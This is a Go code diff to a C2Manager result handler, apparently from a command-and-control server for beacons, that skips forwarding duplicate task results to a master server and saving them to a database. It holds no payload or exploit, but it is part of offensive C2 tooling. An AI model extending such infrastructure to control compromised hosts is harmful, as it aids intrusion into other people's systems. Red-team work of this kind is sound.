@@ -1205,8 +1205,8 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 		}
 		c2.mutex.Unlock()
 
-		// Forward to Master if in distributed mode
-		if masterClient != nil {
+		// Forward to Master if in distributed mode - skip for duplicates
+		if masterClient != nil && !isDuplicate {
 			go func(tid, bid, res string) {
 				c2.mutex.RLock()
 				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
@@ -1290,8 +1290,8 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	}
 	c2.mutex.Unlock()
 
-	// Save result to database (async)
-	if c2.db != nil {
+	// Save result to database (async) - skip for duplicates
+	if c2.db != nil && !isDuplicate {
 		go func(tid, bid, res string) {
 			if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil && c2.debug {
 				logf("[C2] Failed to save task result to database: %v", err)
@@ -1302,8 +1302,8 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 		}(taskID, beaconID, result)
 	}
 
-	// Report result to Master Server (if in distributed mode)
-	if masterClient != nil {
+	// Report result to Master Server (if in distributed mode) - skip for duplicates
+	if masterClient != nil && !isDuplicate {
 		go func(tid, bid, res string) {
 			// Get the master task ID
 			c2.mutex.RLock()
